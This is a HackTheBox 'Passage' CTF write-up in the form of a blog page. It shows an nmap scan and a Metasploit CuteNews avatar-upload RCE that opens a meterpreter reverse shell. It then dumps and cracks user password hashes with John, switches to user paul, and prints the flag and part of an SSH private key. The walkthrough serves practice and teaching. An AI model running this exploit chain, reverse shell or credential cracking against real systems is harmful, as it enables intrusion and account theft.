<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Passage | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="Passage HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/passage/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/passage/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Passage "><meta property="og:description" content="Passage HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/passage/passage.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-03-08T19:36:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/passage/passage.png"><meta name=twitter:title content="Passage "><meta name=twitter:description content="Passage HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Passage ","item":"https://s4ch.github.io/writeups/hackthebox/passage/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Passage ","name":"Passage ","description":"Passage HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"Information Name: Passage Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview Install tools used in this WU on BlackArch Linux:\n1 $ sudo pacman -S nmap exploit-db metasploit ruby-ctf-party haiti john peass Network enumeration Port and service scan with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # Nmap 7.80 scan initiated Mon Sep 7 14:40:30 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.129.8.231 Nmap scan report for 10.129.8.231 Host is up (0.027s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) | 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) |_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Sep 7 14:40:57 2020 -- 1 IP address (1 host up) scanned in 26.35 seconds HTTP exploration At the bottom of the main page we can read:\n1 Powered by CuteNews With exploitdb we can search exploits for CuteNews.\n1 $ searchsploit CuteNews One of the RSS post (http://10.129.8.231/index.php?do=rss\u0026id=11) is telling us there is a Fail2Ban, so bruteforcing is useless.\nDue to unusually large amounts of traffic, we have implemented Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection.\nBy checking the source code repository (https://github.com/CuteNews/cutenews-2.0) we can find some files or paths existing on the webserver without bruteforcing.\nBy consulting http://10.129.8.231/news.php we are redirected to http://passage.htb/CuteNews/rss.php, so a domain is used for a virtual host. Let’s add it to our hosts file:\n1 2 $ cat /etc/hosts | grep pass 10.129.8.231 passage.htb HTTP exploitation In EDB 46698, we see the login page is http://passage.htb/CuteNews/index.php?mod=main\u0026opt=personal\nThis page leaks the exact version: CuteNews 2.1.2.\nLet’s register an account for the authenticated exploit: http://passage.htb/CuteNews/index.php?register\nThen we can add the EDB exploit in msf:\n1 2 3 4 $ cp /usr/share/exploitdb/exploits/php/remote/46698.rb . $ nvim 46698.rb # Fix the comma $ sudo cp 46698.rb /opt/metasploit/modules/exploits/unix/webapp/cutenews_avatar_rce.rb $ sudo updatedb So now we are finally able to use the exploit \u0026 gain a shell access:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ msfconsole msf5 \u003e use exploit/unix/webapp/cutenews_avatar_rce [*] No payload configured, defaulting to php/meterpreter/reverse_tcp msf5 exploit(unix/webapp/cutenews_avatar_rce) \u003e set PASSWORD cyfun PASSWORD =\u003e cyfun msf5 exploit(unix/webapp/cutenews_avatar_rce) \u003e set USERNAME cyfun USERNAME =\u003e cyfun msf5 exploit(unix/webapp/cutenews_avatar_rce) \u003e set rHOSTS 10.129.8.231 rHOSTS =\u003e 10.129.8.231 msf5 exploit(unix/webapp/cutenews_avatar_rce) \u003e set LHOST 10.10.14.157 LHOST =\u003e 10.10.14.157 msf5 exploit(unix/webapp/cutenews_avatar_rce) \u003e run [*] Started reverse TCP handler on 10.10.14.157:4444 [*] http://10.129.8.231:80 - CuteNews is 2.1.2 [+] Authentication was successful with user: cyfun [*] Trying to upload lgepbxvv.php [+] Upload successfully. [*] Sending stage (38288 bytes) to 10.129.8.231 [*] Meterpreter session 1 opened (10.10.14.157:4444 -\u003e 10.129.8.231:57094) at 2020-09-07 15:50:18 +0200 meterpreter \u003e System enumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ cat /etc/os-release NAME=\"Ubuntu\" VERSION=\"16.04.6 LTS (Xenial Xerus)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 16.04.6 LTS\" VERSION_ID=\"16.04\" HOME_URL=\"http://www.ubuntu.com/\" SUPPORT_URL=\"http://help.ubuntu.com/\" BUG_REPORT_URL=\"http://bugs.launchpad.net/ubuntu/\" VERSION_CODENAME=xenial UBUNTU_CODENAME=xenial $ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false whoopsie:x:109:117::/nonexistent:/bin/false avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false saned:x:119:127::/var/lib/saned:/bin/false usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin Privilege Escalation of Machine : from www-data to paul The folder /var/www/html/CuteNews/cdata/users contains users information in various files, eg. 09.php etc. and the data is base64 encoded. So it’s not easy to find info about a particular user at a glance.\nWith cat ??.php I displayed info about all users and then stripped the php directive to keep only the base64 data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319 YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0= YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319 YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxMDoiMTU5OTQ4NDMzMiI7czozOiJjbnQiO3M6MToiMiI7fX19 YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODkxMDg5NjtzOjY6ImhhY2tlciI7fX0= YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6Im5vcmFqQGh0Yi5sb2NhbCI7czo1OiJub3JhaiI7fX0= YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0= YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJub3JhaiI7YToxMTp7czoyOiJpZCI7czoxMDoiMTU5OTQ4NDM5NSI7czo0OiJuYW1lIjtzOjU6Im5vcmFqIjtzOjM6ImFjbCI7czoxOiI0IjtzOjU6ImVtYWlsIjtzOjE1OiJub3JhakBodGIubG9jYWwiO3M6NDoibmljayI7czo1OiJub3JhaiI7czo0OiJwYXNzIjtzOjY0OiI0ZDlmNzU2ZDM2ZjgyODk2ZDk2YzVlOTEzMTA1MTExN2E2ZThjNWZkODlhMTY5ZjA0NDBjNDZhODUzZTJjNDRiIjtzOjM6Imx0cyI7czoxMDoiMTU5OTQ4OTQwOSI7czozOiJiYW4iO3M6MToiMCI7czo0OiJtb3JlIjtzOjYwOiJZVG95T250ek9qUTZJbk5wZEdVaU8zTTZNRG9pSWp0ek9qVTZJbUZpYjNWMElqdHpPakE2SWlJN2ZRPT0iO3M6NjoiYXZhdGFyIjtzOjI1OiJhdmF0YXJfbm9yYWpfeGN0eHVkanMucGhwIjtzOjY6ImUtaGlkZSI7czowOiIiO319fQ== YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ== YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319 YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MjA6ImhhY2tlckBoYWNrZXIuaGFja2VyIjtzOjY6ImhhY2tlciI7fX0= YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ== YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0= YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ== YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319 YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19 YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0= YToxOntzOjQ6Im5hbWUiO2E6Mjp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg5MDY4ODEiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3lreG5hY3B0LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9czo2OiJoYWNrZXIiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg5MTA4OTYiO3M6NDoibmFtZSI7czo2OiJoYWNrZXIiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjA6ImhhY2tlckBoYWNrZXIuaGFja2VyIjtzOjQ6Im5pY2siO3M6NjoiaGFja2VyIjtzOjQ6InBhc3MiO3M6NjQ6ImU3ZDM2ODU3MTU5Mzk4NDI3NDljYzI3YjM4ZDBjY2I5NzA2ZDRkMTRhNTMwNGVmOWVlZTA5Mzc4MGVhYjVkZjkiO3M6MzoibHRzIjtzOjEwOiIxNTk4OTEwOTExIjtzOjM6ImJhbiI7czoxOiIwIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czo2OiJhdmF0YXIiO3M6MjY6ImF2YXRhcl9oYWNrZXJfanB5b3lza3QucGhwIjtzOjY6ImUtaGlkZSI7czowOiIiO319fQ== YToxOntzOjI6ImlkIjthOjE6e2k6MTU5OTQ4NDM5NTtzOjU6Im5vcmFqIjt9fQ== YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0 Then I wrote a short ruby script (using ctf-party lib) to base64 decode each line.\n1 2 3 4 require 'ctf_party' File.readlines('usersb64.txt').each do |line| puts line.chomp.from_b64 end I obtained the following result by running ruby usersb64.rb:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 a:1:{s:5:\"email\";a:1:{s:16:\"paul@passage.htb\";s:10:\"paul-coles\";}} a:1:{s:2:\"id\";a:1:{i:1598829833;s:6:\"egre55\";}} a:1:{s:5:\"email\";a:1:{s:15:\"egre55@test.com\";s:6:\"egre55\";}} a:1:{s:4:\"name\";a:1:{s:5:\"admin\";a:8:{s:2:\"id\";s:10:\"1592483047\";s:4:\"name\";s:5:\"admin\";s:3:\"acl\";s:1:\"1\";s:5:\"email\";s:17:\"nadav@passage.htb\";s:4:\"pass\";s:64:\"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1\";s:3:\"lts\";s:10:\"1592487988\";s:3:\"ban\";s:10:\"1599484332\";s:3:\"cnt\";s:1:\"2\";}}} a:1:{s:2:\"id\";a:1:{i:1598910896;s:6:\"hacker\";}} a:1:{s:5:\"email\";a:1:{s:15:\"cyfun@htb.local\";s:5:\"cyfun\";}} a:1:{s:2:\"id\";a:1:{i:1592483281;s:9:\"sid-meier\";}} a:1:{s:4:\"name\";a:1:{s:5:\"cyfun\";a:11:{s:2:\"id\";s:10:\"1599484395\";s:4:\"name\";s:5:\"cyfun\";s:3:\"acl\";s:1:\"4\";s:5:\"email\";s:15:\"cyfun@htb.local\";s:4:\"nick\";s:5:\"cyfun\";s:4:\"pass\";s:64:\"4d9f756d36f82896d96c5e9131051117a6e8c5fd89a169f0440c46a853e2c44b\";s:3:\"lts\";s:10:\"1599489409\";s:3:\"ban\";s:1:\"0\";s:4:\"more\";s:60:\"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==\";s:6:\"avatar\";s:25:\"avatar_cyfun_xctxudjs.php\";s:6:\"e-hide\";s:0:\"\";}}} a:1:{s:5:\"email\";a:1:{s:17:\"nadav@passage.htb\";s:5:\"admin\";}} a:1:{s:5:\"email\";a:1:{s:15:\"kim@example.com\";s:9:\"kim-swift\";}} a:1:{s:5:\"email\";a:1:{s:20:\"hacker@hacker.hacker\";s:6:\"hacker\";}} a:1:{s:2:\"id\";a:1:{i:1592483236;s:10:\"paul-coles\";}} a:1:{s:4:\"name\";a:1:{s:9:\"sid-meier\";a:9:{s:2:\"id\";s:10:\"1592483281\";s:4:\"name\";s:9:\"sid-meier\";s:3:\"acl\";s:1:\"3\";s:5:\"email\";s:15:\"sid@example.com\";s:4:\"nick\";s:9:\"Sid Meier\";s:4:\"pass\";s:64:\"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88\";s:3:\"lts\";s:10:\"1592485645\";s:3:\"ban\";s:1:\"0\";s:3:\"cnt\";s:1:\"2\";}}} a:1:{s:2:\"id\";a:1:{i:1592483047;s:5:\"admin\";}} a:1:{s:5:\"email\";a:1:{s:15:\"sid@example.com\";s:9:\"sid-meier\";}} a:1:{s:4:\"name\";a:1:{s:10:\"paul-coles\";a:9:{s:2:\"id\";s:10:\"1592483236\";s:4:\"name\";s:10:\"paul-coles\";s:3:\"acl\";s:1:\"2\";s:5:\"email\";s:16:\"paul@passage.htb\";s:4:\"nick\";s:10:\"Paul Coles\";s:4:\"pass\";s:64:\"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd\";s:3:\"lts\";s:10:\"1592485556\";s:3:\"ban\";s:1:\"0\";s:3:\"cnt\";s:1:\"2\";}}} a:1:{s:4:\"name\";a:1:{s:9:\"kim-swift\";a:9:{s:2:\"id\";s:10:\"1592483309\";s:4:\"name\";s:9:\"kim-swift\";s:3:\"acl\";s:1:\"3\";s:5:\"email\";s:15:\"kim@example.com\";s:4:\"nick\";s:9:\"Kim Swift\";s:4:\"pass\";s:64:\"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca\";s:3:\"lts\";s:10:\"1592487096\";s:3:\"ban\";s:1:\"0\";s:3:\"cnt\";s:1:\"3\";}}} a:1:{s:4:\"name\";a:2:{s:6:\"egre55\";a:11:{s:2:\"id\";s:10:\"1598829833\";s:4:\"name\";s:6:\"egre55\";s:3:\"acl\";s:1:\"4\";s:5:\"email\";s:15:\"egre55@test.com\";s:4:\"nick\";s:6:\"egre55\";s:4:\"pass\";s:64:\"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc\";s:4:\"more\";s:60:\"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==\";s:3:\"lts\";s:10:\"1598906881\";s:3:\"ban\";s:1:\"0\";s:6:\"avatar\";s:26:\"avatar_egre55_ykxnacpt.php\";s:6:\"e-hide\";s:0:\"\";}s:6:\"hacker\";a:11:{s:2:\"id\";s:10:\"1598910896\";s:4:\"name\";s:6:\"hacker\";s:3:\"acl\";s:1:\"4\";s:5:\"email\";s:20:\"hacker@hacker.hacker\";s:4:\"nick\";s:6:\"hacker\";s:4:\"pass\";s:64:\"e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9\";s:3:\"lts\";s:10:\"1598910911\";s:3:\"ban\";s:1:\"0\";s:4:\"more\";s:60:\"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==\";s:6:\"avatar\";s:26:\"avatar_hacker_jpyoyskt.php\";s:6:\"e-hide\";s:0:\"\";}}} a:1:{s:2:\"id\";a:1:{i:1599484395;s:5:\"cyfun\";}} I retrieved all the hashes to try to get them cracked.\n1 2 3 4 5 6 admin:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 sid:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 paul:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd kim:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca egre55:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc hacker:e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9 I used to identify the hash type that looks like SHA-256.\n1 2 3 4 5 6 7 8 9 10 11 $ haiti 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 Snefru-256 [JtR: snefru-256] SHA-256 [HC: 1400] [JtR: raw-sha256] RIPEMD-256 Haval-256 [JtR: haval-256-3] GOST R 34.11-94 [HC: 6900] [JtR: gost] GOST CryptoPro S-Box SHA3-256 [HC: 17400] Keccak-256 [HC: 17800] [JtR: raw-keccak-256] Skein-256 [JtR: skein-256] Skein-512(256) And then used John the Ripper to crack some of them:\n1 2 3 4 5 6 7 8 $ john hashes.txt -w /usr/share/wordlists/passwords/rockyou.txt --format=Raw-SHA256 Using default input encoding: UTF-8 Loaded 6 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x]) Warning: poor OpenMP scalability for this hash type, consider --fork=8 Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status hacker (hacker) atlanta1 (paul) Two users are on the system: paul \u0026 nadav, and hopefully we cracked paul’s password so we are able to connect as paul and obtain the first flag.\n1 2 3 4 5 6 7 8 9 www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul su paul Password: atlanta1 paul@passage:/var/www/html/CuteNews/cdata/users$ cd cd paul@passage:~$ cat user.txt cat user.txt 82727a23b73c48168c14aba87fc6a769 Waypoint Let’s save paul’s SSH key as a waypoint because only SSH pubkey method is allowed.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 $ paul@passage:~$ cat .ssh/id_rsa cat .ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/ +L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k 7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4 IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR 